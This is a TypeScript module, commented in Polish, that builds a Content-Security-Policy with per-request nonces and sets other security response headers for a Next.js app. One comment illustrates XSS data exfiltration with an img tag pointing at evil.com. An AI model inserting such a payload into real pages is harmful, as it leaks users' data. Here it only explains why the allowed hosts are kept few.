/**
 * Content Security Policy + secure response headers.
 *
 * CSP jest ustawiana w middleware (per-request, z nonce do `<script>`)
 * — `next.config.mjs` ustawia tylko statyczne headery (X-Frame, Permissions
 * Policy itd.), bo CSP wymaga nonce, który zmienia się każdym requestem.
 *
 * Polityka jest świadomie konserwatywna:
 *   - default-src 'self' (blokuj wszystko spoza domeny)
 *   - script-src 'self' 'nonce-XXX' 'strict-dynamic'  (Next inlinuje skrypty)
 *   - connect-src 'self' + Supabase + Stripe + Anthropic + Fakturownia
 *   - frame-src Stripe (Checkout)
 *   - object-src 'none'   (PDF iframe via blob, nie przez object)
 *   - base-uri 'self'     (anty-base-tag-injection)
 *   - form-action 'self' Stripe
 *   - upgrade-insecure-requests
 *
 * W trybie dev (`NODE_ENV !== 'production'`) dodajemy `'unsafe-eval'` dla
 * React Refresh — bez tego HMR się wywala.
 */

/**
 * Edge-runtime-safe nonce generator (16 bajtów base64).
 * Zwraca nowy nonce na każdy request — istotne, żeby CSP `'nonce-XXX'`
 * był nieprzewidywalny dla atakującego.
 */
export function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  // base64url, bez paddingu — bezpieczne w nagłówku CSP
  let s = "";
  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

interface BuildCspOptions {
  nonce: string;
  isDev: boolean;
}

/**
 * Buduje value dla `Content-Security-Policy`.
 *
 * Lista hostów rozszerzaj ostrożnie — każdy nowy host to potencjalny wektor
 * eksfiltracji danych (XSS → `<img src="evil.com/?data=...">`).
 */
export function buildCsp({ nonce, isDev }: BuildCspOptions): string {
  const scriptSrc = [
    "'self'",
    `'nonce-${nonce}'`,
    "'strict-dynamic'",
    // Stripe.js (Checkout redirects, link-up)
    "https://js.stripe.com",
    // Vercel Analytics / Speed Insights (jeśli dołączone)
    "https://va.vercel-scripts.com",
    isDev ? "'unsafe-eval'" : "",
  ]
    .filter(Boolean)
    .join(" ");

  const styleSrc = [
    "'self'",
    // Tailwind/Next inlinuje krytyczny CSS — 'unsafe-inline' jest niezbędne.
    // Akceptujemy świadomie (CSP dla style nie chroni przed XSS — chroni
    // głównie przed CSS injection, co przy braku style-injection vectora
    // jest niskim ryzykiem).
    "'unsafe-inline'",
  ].join(" ");

  const connectSrc = [
    "'self'",
    // Supabase REST + Realtime + Storage
    "https://*.supabase.co",
    "https://*.supabase.in",
    "wss://*.supabase.co",
    // Stripe API
    "https://api.stripe.com",
    "https://checkout.stripe.com",
    // Anthropic Messages API
    "https://api.anthropic.com",
    // Fakturownia REST
    "https://*.fakturownia.pl",
    "https://app.fakturownia.pl",
    // Vercel observability
    "https://vitals.vercel-insights.com",
  ].join(" ");

  const imgSrc = [
    "'self'",
    "data:",
    "blob:",
    "https://*.supabase.co",
    "https://*.supabase.in",
    // Stripe pixel / Apple Pay logos
    "https://*.stripe.com",
  ].join(" ");

  const frameSrc = [
    "'self'",
    "https://js.stripe.com",
    "https://hooks.stripe.com",
    "https://checkout.stripe.com",
  ].join(" ");

  const fontSrc = ["'self'", "data:"].join(" ");

  const directives = [
    `default-src 'self'`,
    `script-src ${scriptSrc}`,
    `style-src ${styleSrc}`,
    `connect-src ${connectSrc}`,
    `img-src ${imgSrc}`,
    `font-src ${fontSrc}`,
    `frame-src ${frameSrc}`,
    `media-src 'self' blob:`,
    `worker-src 'self' blob:`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self' https://checkout.stripe.com`,
    `frame-ancestors 'none'`,
    `manifest-src 'self'`,
    isDev ? "" : "upgrade-insecure-requests",
  ]
    .filter(Boolean)
    .join("; ");

  return directives;
}

/**
 * Wstrzykuje wszystkie security headery (włącznie z CSP) do
 * `Headers`/`NextResponse`. Wywoływane raz, na końcu middleware.
 */
export function applySecurityHeaders(
  headers: Headers,
  opts: { nonce: string; isDev: boolean },
): void {
  headers.set("Content-Security-Policy", buildCsp(opts));

  // HSTS — 2 lata, włącz subdomeny, preload-ready.
  // Włączamy tylko w produkcji (lokalny dev na http nie miałby działać).
  if (!opts.isDev) {
    headers.set(
      "Strict-Transport-Security",
      "max-age=63072000; includeSubDomains; preload",
    );
  }

  // Anty-clickjacking — duplikujemy z next.config (defense in depth).
  headers.set("X-Frame-Options", "DENY");
  headers.set("X-Content-Type-Options", "nosniff");

  // Cross-Origin isolation — chroni przed Spectre i przeciekiem
  // window.opener.
  headers.set("Cross-Origin-Opener-Policy", "same-origin");
  headers.set("Cross-Origin-Resource-Policy", "same-origin");

  // Referrer + Permissions Policy (duplikujemy z next.config)
  headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  headers.set(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=(), payment=(self \"https://checkout.stripe.com\")",
  );

  // Niech CDN-y nie cache'ują wrażliwych odpowiedzi z nonce.
  // (Statyczne assety są wykluczone z middleware — zob. matcher.)
  headers.set("Vary", "Cookie, Accept-Encoding");
}
